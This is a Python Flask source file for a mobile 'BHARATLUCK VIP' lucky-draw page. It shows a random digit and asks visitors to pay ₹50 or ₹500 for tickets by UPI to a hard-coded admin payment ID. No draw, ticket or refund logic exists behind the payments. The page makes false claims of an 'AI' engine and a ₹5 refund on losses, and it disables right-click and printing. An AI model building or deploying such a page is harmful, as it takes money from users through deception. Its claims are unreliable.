from flask import Flask, render_template_string, request  
import random  
  
app = Flask(__name__)  
  
# --- CONFIGURATION (Bhai ki UPI Set Hai) ---  
MY_UPI_ID = "6268358539@fam"   
MY_NAME = "BHARATLUCK ADMIN"  
  
@app.route('/')  
def lucky_draw():  
    # AI CA Logic: Real-time Result Generation  
    draw_num = random.randint(0, 9)  
    res_text = "BIG" if draw_num >= 5 else "SMALL"  
      
    return render_template_string(f"""  
    <!DOCTYPE html>  
    <html>  
    <head>  
        <meta name="viewport" content="width=device-width, initial-scale=1.0">  
        <style>  
            body {{ background:#000;color:#ffd700;text-align:center;font-family:sans-serif;padding:10px;-webkit-user-select:none; }}  
            .main-card {{ background:#111;padding:25px;border-radius:25px;border:2px solid #ffd700;margin:15px 0;box-shadow:0 0 20px #ffd70044; }}  
            .num-display {{ font-size:100px;font-weight:bold;text-shadow:0 0 25px #ffd700;margin:10px 0; }}  
            .btn-pay {{ background:#ffd700;color:#000;border:none;padding:15px 30px;border-radius:10px;font-weight:bold;font-size:16px;cursor:pointer;width:80%; }}  
            .refund-note {{ color:#0f0;font-size:11px;margin-top:15px;border:1px dashed #0f0;padding:5px; }}  
            @media print {{ body {{ display:none; }} }}  
        </style>  
    </head>  
    <body oncontextmenu="return false;">  
        <h2 style="letter-spacing:3px;">👑 BHARATLUCK VIP</h2>  
          
        <div class="main-card">  
            <p style="font-size:12px;color:#888;">AI GHOST ENGINE LIVE</p>  
            <div class="num-display">{draw_num}</div>  
            <div style="font-size:26px;letter-spacing:4px;font-weight:bold;">{res_text}</div>  
            <p style="font-size:10px;color:#555;margin-top:10px;">Session: {random.randint(1000,9999)} | Memory: 1GB Safe</p>  
        </div>  
  
        <div style="background:#1a1a1a;padding:20px;border-radius:15px;margin-top:10px;">  
            <p style="margin-bottom:15px;">GET YOUR TICKET TO WIN</p>  
            <button onclick="openPayment(50)" style="margin-bottom:10px;" class="btn-pay">GET TICKET (₹50)</button>  
            <button onclick="openPayment(500)" class="btn-pay">GET TICKET (₹500)</button>  
              
            <div class="refund-note">  
                🛡️ AI CA: "Bhai, agar tum haare toh ₹5 Refund seedhe account mein ayega!"  
            </div>  
        </div>  
  
        <div id="pay_modal" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);padding-top:50px;">  
            <div style="background:#222;margin:20px;padding:30px;border-radius:20px;border:1px solid #ffd700;">  
                <h3 style="color:#ffd700;">SECURE UPI PAYMENT</h3>  
                <p style="font-size:14px;">Transfer Amount to Admin ID:</p>  
                <p style="color:#0f0;font-weight:bold;font-size:18px;">{MY_UPI_ID}</p>  
                <br>  
                <a id="upi_link" href="#" style="background:#2ecc71;color:white;padding:15px 30px;text-decoration:none;border-radius:10px;font-weight:bold;display:inline-block;">CLICK TO PAY NOW</a>  
                <br><br>  
                <button onclick="document.getElementById('pay_modal').style.display='none'" style="background:none;color:#888;border:none;">Cancel</button>  
            </div>  
        </div>  
  
        <script>  
            function openPayment(amt) {{  
                document.getElementById('pay_modal').style.display = 'block';  
                let link = "upi://pay?pa={MY_UPI_ID}&pn={MY_NAME}&am=" + amt + "&cu=INR";  
                document.getElementById('upi_link').href = link;  
            }}  
        </script>  
    </body>  
    </html>  
    """)  
  
if __name__ == '__main__':  
    import os  
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
